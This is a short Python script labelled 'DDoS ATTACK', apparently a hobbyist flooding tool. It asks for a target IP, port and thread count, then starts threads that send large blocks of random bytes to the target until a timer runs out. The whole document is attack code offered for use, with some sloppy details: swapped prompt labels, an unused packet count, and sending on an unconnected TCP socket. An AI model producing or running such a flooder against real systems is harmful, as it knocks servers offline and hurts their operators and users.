#!usr/bin/env python3
#--------------------#
# Coded By : Zakka

# Import Module
import random
import socket
import threading
import requests
import os
import time

# Gas ae dlu
print("#-------------------------------------#")
print("[+] DDoS ATTACK By : Zakka")
print("#-------------------------------------#\n")
ip = str(input("[/] Enter IP : "))
port = int(input("[/] Enter Port : "))
times = int(input("[/] Enter Thread : "))
threads = int(input("[/] Enter Packet : "))

timeout = time.time() + 1 * times

def attack():
    try:
        bytes = random._urandom(9024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < timeout:
            sock.sendto(bytes*random.randint(1024,9024),(ip, port))
        print("Attacking Server")
    except:
        pass

if __name__ == "__main__":
    for y in range(times):
        th = threading.Thread(target = attack)
        th.start()
